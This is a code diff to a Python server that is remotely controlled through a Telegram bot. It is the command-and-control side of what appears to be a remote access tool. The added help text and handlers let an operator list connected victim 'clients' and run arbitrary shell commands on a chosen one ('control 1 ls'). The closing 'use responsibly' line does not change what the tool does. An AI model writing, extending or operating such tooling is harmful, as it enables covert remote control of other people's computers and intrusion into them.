@@ -22,7 +22,30 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
-# Handle commands received from Telegram
+# Send help message with all commands
+def send_help_message():
+    help_text = """
+🤖 **Telegram Bot Commands**:
+
+1. **/start** - Start the bot and check if the server is ready.
+2. **list** - Get a list of all active clients connected to the server.
+   - Format: `list`
+3. **control** - Send a command to a specific client.
+   - Format: `control <client_id> <command>`
+   - Example: `control 1 ls`
+4. **exit** - Shut down the server and disconnect all clients.
+   - Format: `exit`
+
+💡 **How it works**:
+- Each client connected to the server gets a unique `client_id`.
+- Use the `list` command to view active `client_id`s and their details.
+- Use the `control` command to execute a shell command on a target client.
+
+Use responsibly and ethically! 🚀
+"""
+    send_telegram_message(help_text)
+
+# Handle commands from Telegram
 def handle_telegram_commands():
     last_update_id = None
     while True:
@@ -36,11 +59,13 @@ def handle_telegram_commands():
                 user_name = update['message']['from']['first_name']
 
                 if message_text == "/start":
-                    send_telegram_message(f"Hi {user_name}, the server is ready!")
+                    send_telegram_message(f"Hi {user_name}, the server is ready! Use /help to see all commands.")
+                elif message_text == "/help":
+                    send_help_message()
                 elif message_text.startswith("list"):
                     # List all connected clients
                     active_clients = "\n".join([f"{id}: {addr}" for id, addr in clients.items()])
-                    send_telegram_message(f"Active Clients:\n{active_clients}")
+                    send_telegram_message(f"Active Clients:\n{active_clients}" if active_clients else "No active clients.")
                 elif message_text.startswith("control"):
                     # Example: control 1 ls
                     try:
@@ -59,7 +84,7 @@ def handle_telegram_commands():
                     send_telegram_message("Shutting down server...")
                     exit(0)
                 else:
-                    send_telegram_message("Invalid command. Use /start, list, or control.")
+                    send_telegram_message("Invalid command. Use /help to see all available commands.")
         except Exception as e:
             print(f"Error handling Telegram commands: {e}")
             send_telegram_message(f"Error: {e}")
